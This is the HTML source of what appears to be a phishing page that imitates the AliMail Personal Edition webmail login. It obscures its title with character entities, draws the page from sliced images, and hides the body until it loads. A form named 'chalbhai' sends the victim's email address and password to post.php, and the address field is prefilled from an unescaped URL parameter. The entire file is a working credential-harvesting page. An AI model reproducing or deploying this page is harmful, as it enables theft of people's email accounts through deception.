<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#108;&#105;&#77;&#97;&#105;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#69;&#100;&#105;&#116;&#105;&#111;&#110;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox {
    height: 25px;
    width: 275px;
    border: 1px solid #ccc;
    color: #797979;
	padding-left: 5px;
     box-shadow: 0px 0px 1px #BBB inset;
   }
 .textbox:focus {
   
    outline: 0;
}

 </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:168px; z-index:0"><img src="images/yu1.png" alt="" title="" border=0 width=1365 height=168></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:167px; width:1365px; height:261px; z-index:1"><img src="images/yu2.png" alt="" title="" border=0 width=1365 height=261></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:427px; width:1365px; height:234px; z-index:2"><img src="images/yu3.png" alt="" title="" border=0 width=1365 height=234></div>

<div id="image4" style="position:absolute; overflow:hidden; left:812px; top:22px; width:489px; height:20px; z-index:3"><a href="#"><img src="images/yu4.png" alt="" title="" border=0 width=489 height=20></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:415px; top:628px; width:213px; height:19px; z-index:4"><a href="#"><img src="images/yu5.png" alt="" title="" border=0 width=213 height=19></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:1038px; top:211px; width:104px; height:18px; z-index:5"><a href="#"><img src="images/yu6.png" alt="" title="" border=0 width=104 height=18></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1087px; top:314px; width:57px; height:17px; z-index:6"><a href="#"><img src="images/yu7.png" alt="" title="" border=0 width=57 height=17></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#38463;&#37324;&#37038;&#31665;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:251px;left:890px;top:172px;z-index:7">
<input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:251px;left:890px;top:231px;z-index:8">
<div id="formimage1" style="position:absolute; left:889px; top:275px; z-index:9"><input type="image" name="formimage1" width="252" height="32" src="images/singn.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
